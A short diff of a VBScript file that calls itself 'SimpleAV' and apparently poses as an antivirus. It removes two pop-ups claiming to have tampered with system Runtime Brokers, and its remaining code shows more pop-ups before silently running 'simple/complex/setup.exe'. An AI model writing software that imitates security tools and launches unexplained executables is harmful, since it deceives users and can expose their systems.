@@ -23,8 +23,6 @@ If answer = vbYes Then
  
   Else
     a=MsgBox("Thanks for making your decision... we will continue with our virus detection process ", 0+64, "SimpleAV")
-    d=MsgBox("We have succsessfuly scanned your Runtime Brokers, and have tampered with them.", 0+64, "Simple")
-    f=MsgBox("The past processes will run everytime you run this Simple antivirus!!!", 0+64, "Simple")
     f=MsgBox("Click any button below to run our very simple antivirus", 0+64, "Simple")
     CreateObject("WScript.Shell").Run "simple/complex/setup.exe"
     
